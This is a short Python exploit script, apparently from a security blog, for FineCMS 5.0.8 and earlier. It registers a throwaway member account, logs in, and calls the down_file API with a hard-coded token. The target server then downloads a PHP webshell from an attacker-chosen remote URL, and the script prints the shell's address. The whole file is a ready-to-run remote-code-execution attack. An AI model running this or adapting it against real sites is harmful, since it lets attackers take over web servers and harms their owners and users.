'''
author:F0rmat
usage:http://getpass.cn/2018/02/28/%e9%80%9a%e6%9d%80FineCMS5.0.8%e5%8f%8a%e7%89%88%e6%9c%ac%e4%bb%a5%e4%b8%8bgetshell%e7%9a%84%e6%bc%8f%e6%b4%9e(%e6%af%8f%e5%a4%a9%e4%b8%80%e6%b4%9e)
'''
import sys
import random
import requests
import json
import time

def exploit(target,rtarget):
    username = random.randint(0, 999999)
    seed = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    email = []
    for i in range(8):
        email.append(random.choice(seed))
    email = ''.join(email)

    # step 1 register
    register_url = target + "/index.php?s=member&c=register&m=index"
    register_payload = {"back": "", "data[username]": username, "data[password]": "123456", "data[password2]": "123456",
                        "data[email]": email + "@" + email + ".com"}
    # step 2 login
    login_url = target + "/index.php?s=member&c=login&m=index"
    login_payload = {"back": "", "data[username]": username, "data[password]": "123456", "data[auto]": "1"}

    url = target+"/index.php?s=member&c=api&m=down_file"
    payload = {"url":"code=ad3eXTkH4Wt084pW46p7DBSt1KX0FwthAs4o9oBH8WVi","file":rtarget}
    # step 3 start hacking"
    s = requests.session()
    s.post(register_url, data=register_payload)
    s.post(login_url, data=login_payload)
    res=s.post(url,data=payload).content
    hjson = json.loads(res)
    if "php" in res:
        print "shell:"+target+"/uploadfile/"+time.strftime("%Y%m")+"/"+hjson['name']
    else:
        print "failure"

if len(sys.argv)<5:
    print 'python down_file_getshell.py -h http://127.0.0.1 -r http://10.0.0.1/shell.php'
else:
    target = sys.argv[2]
    rtarget = sys.argv[4]
    exploit(target,rtarget)
